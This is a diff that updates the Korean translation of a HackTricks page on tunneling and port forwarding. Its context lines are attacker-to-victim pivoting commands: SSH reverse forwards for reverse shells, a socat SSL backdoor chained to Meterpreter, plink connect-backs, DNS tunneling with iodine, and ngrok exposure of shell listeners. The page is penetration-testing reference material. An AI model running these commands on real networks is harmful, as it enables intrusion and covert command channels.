@@ -1,16 +1,16 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks 지원하기</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
@@ -69,9 +69,9 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### 리버스 포트 포워딩
 
-내부 호스트에서 DMZ를 통해 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
+이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -82,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정은 루트 로그인을 허용해야 합니다:\
+두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -169,7 +169,7 @@ To note:
 
 * Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
 * 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
-* **관리자 권한이 필요하지 않습니다** 고포트에서 리버스 포트 포워드를 생성하기 위해.
+* **관리자 권한이 필요하지 않습니다** 고포트에서 리버스 포트 포워드를 생성하는 데.
 
 ### rPort2Port local
 
@@ -247,8 +247,8 @@ listener_list
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-역방향 터널. 터널은 피해자에서 시작됩니다.\
-127.0.0.1:1080에서 socks4 프록시가 생성됩니다.
+리버스 터널. 터널은 피해자에서 시작됩니다.\
+127.0.0.1:1080에 socks4 프록시가 생성됩니다.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -286,7 +286,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter를 통한 SSL Socat
+### SSL Socat을 통한 Meterpreter
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -302,7 +302,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### SSL Socat 터널
 
 **/bin/sh 콘솔**
 
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).
 
-이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 우리의 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리의 머신의 포트로 포워딩하려면:
+이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 우리의 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리의 머신의 포트로 포워딩합니다:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -364,13 +364,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받게 되고, **127.0.0.1:1080**에서 **수신**할 것입니다.
+이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받을 것입니다. 그리고 **127.0.0.1:1080**에서 **수신**할 것입니다.
 
 **RDP**를 통해 **연결**하고 희생자 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드 및 실행합니다:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-이제 공격자 머신에서 포트 1080이 수신 대기 중인지 확인하십시오:
+이제 당신의 머신(공격자)에서 포트 1080이 수신 대기 중인지 확인하세요:
 ```
 netstat -antb | findstr 1080
 ```
@@ -403,7 +403,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자는 포트 2222를 통해 연결할 수 있습니다.\
-또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수도 있습니다.
+또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수 있습니다.
 
 ## YARP
 
@@ -415,7 +415,7 @@ Microsoft에서 만든 리버스 프록시입니다. 여기에서 찾을 수 있
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 DNS 쿼리를 사용하여 데이터 간에 터널링할 수 있습니다.
+두 시스템 모두에서 루트 권한이 필요하며, DNS 쿼리를 사용하여 tun 어댑터를 생성하고 데이터 터널링을 수행합니다.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -489,7 +489,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **는 한 줄의 명령어로 솔루션을 인터넷에 노출하는 도구입니다.**\
+[**ngrok**](https://ngrok.com/) **은 한 줄의 명령어로 솔루션을 인터넷에 노출하는 도구입니다.**\
 &#xNAN;_&#x45;xposition URI는 다음과 같습니다:_ **UID.ngrok.io**
 
 ### 설치
@@ -516,7 +516,7 @@ _필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### HTTP로 파일 노출하기
+#### HTTP를 통한 파일 노출
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -524,7 +524,7 @@ _필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._
 #### HTTP 호출 스니핑
 
 _XSS, SSRF, SSTI 등에 유용..._\
-stdout 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서 직접.
+stdout에서 직접 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서.
 
 #### 내부 HTTP 서비스 터널링
 ```bash
@@ -566,7 +566,7 @@ GCP 해킹 배우기 및 연습하기: <img src="../.gitbook/assets/grte.png" al
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
